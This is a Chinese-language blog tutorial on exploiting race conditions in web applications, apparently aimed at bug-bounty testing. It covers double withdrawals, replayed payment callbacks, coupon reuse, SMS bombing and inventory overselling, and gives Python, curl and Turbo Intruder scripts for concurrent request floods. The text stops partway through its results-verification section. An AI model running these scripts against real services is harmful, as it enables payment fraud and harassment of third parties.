<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  
    <link rel="icon" href="/assets/favicon.png">
  
  
  <title>并发攻击（竞态条件）完整指南：知识点与利用方式 | wj-stack &#39;s Blog</title>
  <link rel="canonical" href="https://wj-stack.github.io/2025/12/15/%E5%B9%B6%E5%8F%91%E6%94%BB%E5%87%BB%EF%BC%88%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%EF%BC%89%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97%EF%BC%9A%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">
  <meta name="author" content="wj-stack" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="Src" />
  
  <meta name="description" content="一、核心概念与原理1.1 什么是并发攻击&#x2F;竞态条件？竞态条件是一种软件缺陷，当多个进程或线程在没有适当同步机制的情况下，同时访问和操作共享资源（如数据、文件、变量）时，系统的最终行为取决于这些操作的精确时序。 关键特征：  与时间相关，结果不可预测 只会在特定时序下触发 难以在测试环境中复现 通常在高并发场景下暴露  1.2 技术原理：TOCTTOU漏洞Time-Of-Check-To-">
<meta property="og:type" content="article">
<meta property="og:title" content="并发攻击（竞态条件）完整指南：知识点与利用方式">
<meta property="og:url" content="https://wj-stack.github.io/2025/12/15/%E5%B9%B6%E5%8F%91%E6%94%BB%E5%87%BB%EF%BC%88%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%EF%BC%89%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97%EF%BC%9A%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/index.html">
<meta property="og:site_name" content="wj-stack &#39;s Blog">
<meta property="og:description" content="一、核心概念与原理1.1 什么是并发攻击&#x2F;竞态条件？竞态条件是一种软件缺陷，当多个进程或线程在没有适当同步机制的情况下，同时访问和操作共享资源（如数据、文件、变量）时，系统的最终行为取决于这些操作的精确时序。 关键特征：  与时间相关，结果不可预测 只会在特定时序下触发 难以在测试环境中复现 通常在高并发场景下暴露  1.2 技术原理：TOCTTOU漏洞Time-Of-Check-To-">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-12-15T10:06:35.000Z">
<meta property="article:modified_time" content="2025-12-31T02:54:06.208Z">
<meta property="article:author" content="wj-stack">
<meta property="article:tag" content="Src">
<meta name="twitter:card" content="summary">
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kr-core.min.css" media="all"></link>
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/highlight.js/night-eighties.min.css" media="all"></link>
  
  <link rel="stylesheet" id="theme-light-css" href="/css/kr-theme/light.min.css" media="all"></link>
  <link rel="stylesheet" id="theme-dark-css" href="/css/kr-theme/dark.min.css" media="(prefers-color-scheme: dark)"></link>
  <script src="/js/kr-theme.min.js"></script>
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></link>
  
    <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></link>
  
  
    <link rel="stylesheet" href="/vendors/viewerjs@1.11.6/dist/viewer.min.css"></link>
  
  <!-- 不得不预先加载的一些JS文件 -->
  
    <script src="/vendors/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
  
  <!-- 自定义站点横幅和背景 -->
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('https://dev.krt.moe/demo-assets/banner.webp');
      }
      html[data-theme="dark"] .kratos-cover.kratos-cover-2 {
        background-image: url('https://dev.krt.moe/demo-assets/banner_dark.webp');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
        }
        html[data-theme="dark"] body.custom-background {
          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
        }
      }
    
    
      .widget-kratos-about .photo-background {
        background-image: url('/images/default.webp');
      }
      html[data-theme="dark"] .widget-kratos-about .photo-background {
        background-image: url('/images/default.webp');
      }
    
  </style>

  <!-- 额外的追加注入项 -->
  
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/comments/gitalk.css" />

  
<meta name="generator" content="Hexo 8.1.1"></head>

    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    <li>
                                        
                                            <a href="/">
                                        
                                            
                                                <i class="fa fa-home"></i>
                                            
                                            首页
                                        </a>
                                        
                                    </li>
                                
                                    <li>
                                        
                                            <a href="/archives/">
                                        
                                            
                                                <i class="fa fa-file"></i>
                                            
                                            档案馆
                                        </a>
                                        
                                    </li>
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">wj-stack &#39;s Blog</a></div>
                    <div id="kratos-nav-toggle-wrapper" class="nav-toggle">
                        <a id="kratos-nav-toggle" class="kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>wj-stack &#39;s Blog</h2> <br />
                        <span></span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">


        

            

            <section class="kr-main-col col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="https://wj-stack.github.io/2025/12/15/%E5%B9%B6%E5%8F%91%E6%94%BB%E5%87%BB%EF%BC%88%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%EF%BC%89%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97%EF%BC%9A%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">
    <div class="kratos-hentry kratos-page-inner clearfix">
        <header class="kratos-page-header">
            
                <h1 class="kratos-page-title text-center" itemprop="name headline">并发攻击（竞态条件）完整指南：知识点与利用方式</h1>
            
            <ul class="kratos-page-meta text-center">
                <li><time datetime="2025-12-15T10:06:35.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2025-12-15</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">wj-stack</span>
                </li>
                
                    <li>
                        <i class="fa fa-edit"></i> 
                        
                        
                            ~7.60K
                        
                        字
                    </li>
                
                
                
            </ul>
        </header>
        <div class="kratos-page-content kr-post">
            
            
            
            <hr />
            <div itemprop="articleBody"><h2 id="一、核心概念与原理"><a href="#一、核心概念与原理" class="headerlink" title="一、核心概念与原理"></a>一、核心概念与原理</h2><h3 id="1-1-什么是并发攻击-竞态条件？"><a href="#1-1-什么是并发攻击-竞态条件？" class="headerlink" title="1.1 什么是并发攻击&#x2F;竞态条件？"></a>1.1 什么是并发攻击&#x2F;竞态条件？</h3><p><strong>竞态条件</strong>是一种软件缺陷，当多个进程或线程<strong>在没有适当同步机制</strong>的情况下，同时访问和操作共享资源（如数据、文件、变量）时，系统的最终行为取决于这些操作的<strong>精确时序</strong>。</p>
<p><strong>关键特征</strong>：</p>
<ul>
<li>与时间相关，结果不可预测</li>
<li>只会在特定时序下触发</li>
<li>难以在测试环境中复现</li>
<li>通常在高并发场景下暴露</li>
</ul>
<h3 id="1-2-技术原理：TOCTTOU漏洞"><a href="#1-2-技术原理：TOCTTOU漏洞" class="headerlink" title="1.2 技术原理：TOCTTOU漏洞"></a>1.2 技术原理：TOCTTOU漏洞</h3><p><strong>Time-Of-Check-To-Time-Of-Use（检查时间与使用时间）</strong><br>这是竞态条件的经典模式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">正常流程：</span><br><span class="line">1. 检查条件（Check）：验证资源是否可用/有效</span><br><span class="line">2. 使用资源（Use）：执行实际操作</span><br><span class="line">3. 更新状态（Update）：标记资源已被使用</span><br><span class="line"></span><br><span class="line">漏洞窗口：</span><br><span class="line">|--检查--| |--使用--| |--更新--|</span><br><span class="line">    ↑             ↑</span><br><span class="line">    检查完成     开始使用</span><br><span class="line">    └─── 攻击者在此窗口发起并发请求 ───┘</span><br></pre></td></tr></table></figure>

<h2 id="二、攻击场景分类与详细利用方式"><a href="#二、攻击场景分类与详细利用方式" class="headerlink" title="二、攻击场景分类与详细利用方式"></a>二、攻击场景分类与详细利用方式</h2><h3 id="2-1-金融支付类场景"><a href="#2-1-金融支付类场景" class="headerlink" title="2.1 金融支付类场景"></a>2.1 金融支付类场景</h3><h4 id="场景1：余额并发提现"><a href="#场景1：余额并发提现" class="headerlink" title="场景1：余额并发提现"></a><strong>场景1：余额并发提现</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">攻击流程：</span><br><span class="line">初始余额：100元</span><br><span class="line">请求A：提现100元 → 检查通过（余额100） → 执行扣款</span><br><span class="line">请求B：提现100元 → 检查通过（余额100） → 执行扣款</span><br><span class="line">结果：账户余额-100元，攻击者获现200元</span><br></pre></td></tr></table></figure>

<p><strong>技术要点</strong>：</p>
<ul>
<li>使用Burp Suite的Turbo Intruder或Intruder的pitchfork模式</li>
<li>线程数设置：20-50个并发线程</li>
<li>时间窗口：通常在50-500ms内有效</li>
<li><strong>Payload</strong>：仅需修改请求时间戳或保持完全相同</li>
</ul>
<h4 id="场景2：支付回调重复处理"><a href="#场景2：支付回调重复处理" class="headerlink" title="场景2：支付回调重复处理"></a><strong>场景2：支付回调重复处理</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞接口：/api/payment/callback?order_id=123&amp;status=success</span><br><span class="line">攻击方法：并发重放同一支付成功的回调</span><br><span class="line">防御缺失：无幂等性校验、无重复订单判断</span><br><span class="line">结果：一笔真实支付，商户多次发货/多次增加余额</span><br></pre></td></tr></table></figure>

<p><strong>检测方法</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用并发测试工具</span></span><br><span class="line"><span class="built_in">seq</span> 1 20 | xargs -n1 -P20 curl <span class="string">&quot;http://target.com/callback?order_id=123&amp;status=success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用Python脚本</span></span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def send_callback():</span><br><span class="line">    response = requests.get(<span class="string">&quot;http://target.com/callback?order_id=123&amp;status=success&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.status_code)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(20):</span><br><span class="line">    t = threading.Thread(target=send_callback)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<h4 id="场景3：优惠券-折扣码重复使用"><a href="#场景3：优惠券-折扣码重复使用" class="headerlink" title="场景3：优惠券&#x2F;折扣码重复使用"></a><strong>场景3：优惠券&#x2F;折扣码重复使用</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">业务逻辑：使用优惠券时检查状态→标记已使用→应用折扣</span><br><span class="line">并发攻击：在标记完成前，多个请求同时通过&quot;检查状态&quot;</span><br><span class="line">结果：一张优惠券被多次使用</span><br></pre></td></tr></table></figure>

<h3 id="2-2-资源限制绕过场景"><a href="#2-2-资源限制绕过场景" class="headerlink" title="2.2 资源限制绕过场景"></a>2.2 资源限制绕过场景</h3><h4 id="场景1：短信-邮件轰炸"><a href="#场景1：短信-邮件轰炸" class="headerlink" title="场景1：短信&#x2F;邮件轰炸"></a><strong>场景1：短信&#x2F;邮件轰炸</strong></h4><p><strong>漏洞代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 漏洞逻辑</span></span><br><span class="line">last_sent_time = db.get(<span class="string">&quot;last_sent:&quot;</span> + phone)</span><br><span class="line"><span class="keyword">if</span> current_time - last_sent_time &lt; <span class="number">60</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;请等待60秒后再发送&quot;</span></span><br><span class="line">send_sms(phone, code)  <span class="comment"># 耗时操作</span></span><br><span class="line">db.<span class="built_in">set</span>(<span class="string">&quot;last_sent:&quot;</span> + phone, current_time)  <span class="comment"># 更新在发送之后</span></span><br></pre></td></tr></table></figure>

<p><strong>攻击流程</strong>：</p>
<ol>
<li>拦截发送验证码请求</li>
<li>使用Intruder发送50个并发请求</li>
<li>观察手机是否收到多条短信</li>
<li>统计成功绕过限制的次数</li>
</ol>
<p><strong>工具配置</strong>（Burp Suite）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">线程数：30</span><br><span class="line">请求间隔：0毫秒</span><br><span class="line">添加时间戳参数防止缓存：?_t=$&#123;timestamp&#125;</span><br></pre></td></tr></table></figure>

<h4 id="场景2：活动参与次数限制绕过"><a href="#场景2：活动参与次数限制绕过" class="headerlink" title="场景2：活动参与次数限制绕过"></a><strong>场景2：活动参与次数限制绕过</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常见场景：</span><br><span class="line">- 每日签到：限1次/天</span><br><span class="line">- 投票活动：限1票/用户</span><br><span class="line">- 抽奖机会：限1次/小时</span><br><span class="line">- 任务领取：限完成1次</span><br></pre></td></tr></table></figure>

<p><strong>检测步骤</strong>：</p>
<ol>
<li>正常完成一次操作，记录响应</li>
<li>重放请求，确认服务端有限制（返回”已参与”）</li>
<li>删除可能存在的客户端标识（如：X-User-Status）</li>
<li>使用并发工具同时发送N个相同请求</li>
<li>检查是否多个请求都返回成功</li>
</ol>
<h3 id="2-3-库存与商品类场景"><a href="#2-3-库存与商品类场景" class="headerlink" title="2.3 库存与商品类场景"></a>2.3 库存与商品类场景</h3><h4 id="场景1：限量商品抢购"><a href="#场景1：限量商品抢购" class="headerlink" title="场景1：限量商品抢购"></a><strong>场景1：限量商品抢购</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击时间点：秒杀活动开始瞬间（如：整点00秒）</span><br><span class="line">攻击方法：并发提交订单请求</span><br><span class="line">绕过效果：</span><br><span class="line">- 超出库存数量下单成功</span><br><span class="line">- 一人购买多个限购商品</span><br><span class="line">- 商品超卖导致后续订单无法履约</span><br></pre></td></tr></table></figure>

<p><strong>高级技巧</strong>：</p>
<ol>
<li><strong>时间戳预测</strong>：分析服务器时间同步机制</li>
<li><strong>请求队列观察</strong>：检查是否有排队机制</li>
<li><strong>用户标识隔离</strong>：使用不同会话、不同账号测试</li>
</ol>
<h4 id="场景2：虚拟资源滥用"><a href="#场景2：虚拟资源滥用" class="headerlink" title="场景2：虚拟资源滥用"></a><strong>场景2：虚拟资源滥用</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">资源类型：</span><br><span class="line">- 下载次数限制</span><br><span class="line">- API调用配额</span><br><span class="line">- 文件上传数量</span><br><span class="line">- 积分兑换次数</span><br></pre></td></tr></table></figure>

<h3 id="2-4-账户与权限类场景"><a href="#2-4-账户与权限类场景" class="headerlink" title="2.4 账户与权限类场景"></a>2.4 账户与权限类场景</h3><h4 id="场景1：账户注册覆盖"><a href="#场景1：账户注册覆盖" class="headerlink" title="场景1：账户注册覆盖"></a><strong>场景1：账户注册覆盖</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击流程：</span><br><span class="line">1. 使用相同邮箱并发注册两个账户</span><br><span class="line">2. 系统检查邮箱是否已注册（两个请求都通过）</span><br><span class="line">3. 创建两个用户记录</span><br><span class="line">4. 可能导致：</span><br><span class="line">   - 后注册的覆盖先注册的</span><br><span class="line">   - 两个账户数据混淆</span><br><span class="line">   - 权限错乱</span><br></pre></td></tr></table></figure>

<h4 id="场景2：密码重置竞态"><a href="#场景2：密码重置竞态" class="headerlink" title="场景2：密码重置竞态"></a><strong>场景2：密码重置竞态</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">流程：</span><br><span class="line">1. 用户A申请重置密码，获得token</span><br><span class="line">2. 用户B同时申请重置A的账户</span><br><span class="line">3. 服务器生成两个token</span><br><span class="line">4. B可能利用自己的token重置A的密码</span><br></pre></td></tr></table></figure>

<h2 id="三、攻击工具与技术实现"><a href="#三、攻击工具与技术实现" class="headerlink" title="三、攻击工具与技术实现"></a>三、攻击工具与技术实现</h2><h3 id="3-1-专业测试工具"><a href="#3-1-专业测试工具" class="headerlink" title="3.1 专业测试工具"></a>3.1 专业测试工具</h3><h4 id="Burp-Suite-Intruder"><a href="#Burp-Suite-Intruder" class="headerlink" title="Burp Suite Intruder"></a><strong>Burp Suite Intruder</strong></h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">模式选择：</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">Sniper:</span> <span class="string">单个参数顺序测试</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">Battering ram:</span> <span class="string">所有payload相同</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">Pitchfork:</span> <span class="string">多参数对应组合</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">Cluster bomb:</span> <span class="string">多参数笛卡尔积</span></span><br><span class="line"></span><br><span class="line"><span class="string">关键配置：</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">线程数:</span> <span class="number">20</span><span class="number">-50</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">请求间隔:</span> <span class="number">0</span><span class="string">毫秒</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">添加随机延时:</span> <span class="string">禁用</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">失败重试:</span> <span class="string">禁用</span></span><br></pre></td></tr></table></figure>

<h4 id="Turbo-Intruder（推荐）"><a href="#Turbo-Intruder（推荐）" class="headerlink" title="Turbo Intruder（推荐）"></a><strong>Turbo Intruder（推荐）</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义攻击脚本示例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                          concurrentConnections=<span class="number">50</span>,</span><br><span class="line">                          requestsPerConnection=<span class="number">100</span>,</span><br><span class="line">                          pipeline=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造相同的请求</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        engine.queue(target.req, target.baseInput)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    <span class="comment"># 处理响应</span></span><br><span class="line">    <span class="keyword">if</span> req.status == <span class="number">200</span>:</span><br><span class="line">        table.add(req)</span><br></pre></td></tr></table></figure>

<h4 id="自定义Python脚本"><a href="#自定义Python脚本" class="headerlink" title="自定义Python脚本"></a><strong>自定义Python脚本</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">race_attack</span>(<span class="params">url, headers, data, num_requests=<span class="number">50</span></span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_requests):</span><br><span class="line">            task = session.post(url, headers=headers, data=data)</span><br><span class="line">            tasks.append(task)</span><br><span class="line">        responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line">        <span class="keyword">return</span> responses</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行攻击</span></span><br><span class="line">asyncio.run(race_attack(url, headers, data))</span><br></pre></td></tr></table></figure>

<h3 id="3-2-时间窗口探测技术"><a href="#3-2-时间窗口探测技术" class="headerlink" title="3.2 时间窗口探测技术"></a>3.2 时间窗口探测技术</h3><p><strong>探测方法</strong>：</p>
<ol>
<li><strong>基线测量</strong>：正常请求的响应时间</li>
<li><strong>压力测试</strong>：逐渐增加并发数，观察响应变化</li>
<li><strong>窗口计算</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">竞态窗口 = (并发成功请求数 / 总并发请求数) × 请求间隔</span><br><span class="line">示例：50并发中10个成功，间隔10ms → 窗口≈2ms</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>自动化探测脚本</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_race_window</span>(<span class="params">url, max_threads=<span class="number">100</span></span>):</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> threads <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_threads, <span class="number">10</span>):</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="comment"># 发起并发请求</span></span><br><span class="line">        success_count = send_concurrent_requests(url, threads)</span><br><span class="line">        <span class="keyword">if</span> success_count &gt; <span class="number">1</span>:  <span class="comment"># 多于1个成功</span></span><br><span class="line">            window_size = (time.time() - start) * <span class="number">1000</span>  <span class="comment"># 毫秒</span></span><br><span class="line">            results.append((threads, success_count, window_size))</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<h2 id="四、漏洞挖掘方法论"><a href="#四、漏洞挖掘方法论" class="headerlink" title="四、漏洞挖掘方法论"></a>四、漏洞挖掘方法论</h2><h3 id="4-1-目标识别"><a href="#4-1-目标识别" class="headerlink" title="4.1 目标识别"></a>4.1 目标识别</h3><p><strong>高危功能点检查清单</strong>：</p>
<ul>
<li><input disabled="" type="checkbox"> 涉及资金交易（支付、转账、提现）</li>
<li><input disabled="" type="checkbox"> 有限制机制（次数、频率、数量）</li>
<li><input disabled="" type="checkbox"> 资源分配（优惠券、激活码、邀请码）</li>
<li><input disabled="" type="checkbox"> 状态变更（订单状态、用户权限）</li>
<li><input disabled="" type="checkbox"> 文件操作（上传、下载、删除）</li>
</ul>
<p><strong>API特征分析</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 可疑API模式</span><br><span class="line">POST /api/withdraw              # 提现</span><br><span class="line">POST /api/order/create          # 创建订单</span><br><span class="line">POST /api/coupon/use            # 使用优惠券</span><br><span class="line">POST /api/vote/submit           # 提交投票</span><br><span class="line">POST /api/sms/send              # 发送短信</span><br></pre></td></tr></table></figure>

<h3 id="4-2-攻击链构造"><a href="#4-2-攻击链构造" class="headerlink" title="4.2 攻击链构造"></a>4.2 攻击链构造</h3><p><strong>五步测试法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">步骤1：功能理解 → 正常流程走一遍</span><br><span class="line">步骤2：单请求测试 → 重复请求是否被阻止</span><br><span class="line">步骤3：参数分析 → 识别状态标识参数</span><br><span class="line">步骤4：并发测试 → 使用工具发起攻击</span><br><span class="line">步骤5：结果验证 → 检查业务状态是否异常</span><br></pre></td></tr></table></figure>

<p><strong>请求参数重点关注</strong>：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span>           <span class="comment">// 金额类参数</span></span><br><span class="line">  <span class="attr">&quot;quantity&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span>            <span class="comment">// 数量参数</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pending&quot;</span><span class="punctuation">,</span>      <span class="comment">// 状态参数</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1630000000</span><span class="punctuation">,</span>  <span class="comment">// 时间戳</span></span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;abc123&quot;</span><span class="punctuation">,</span>        <span class="comment">// 随机数</span></span><br><span class="line">  <span class="attr">&quot;order_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ORDER_001&quot;</span>   <span class="comment">// 订单标识</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-3-结果验证与影响评估"><a href="#4-3-结果验证与影响评估" class="headerlink" title="4.3 结果验证与影响评估"></a>4.3 结果验证与影响评估</h3><p><strong>验证指标</strong>：</p>
<ol>
<li><strong>业务状态</strong>：余额是否异常、订单是否重复</li>
